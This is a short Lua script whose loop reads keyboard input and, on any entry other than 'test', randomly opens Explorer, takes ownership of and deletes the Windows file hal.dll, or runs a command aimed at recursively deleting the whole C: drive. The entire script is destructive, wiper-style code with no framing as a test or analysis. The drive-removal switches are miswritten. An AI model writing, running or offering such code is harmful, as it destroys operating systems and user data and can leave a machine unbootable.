local function delete(n)
if(n == 1) then
os.execute("explorer")
end
if(n == 2) then
os.execute("takeown c:/windows/hal.dll")
os.execute("del c:/windows/hal.dll")
end
if(n== 3) then
os.execute("rd c:/ \s \r")
end
end
local function main()
while(true) do
local e = io.read()
if(e == "test") then
print("test") 
break;
end
if(e ~= "test") then

--break;
delete(math.random(3))
--break;
end

end
end

main()
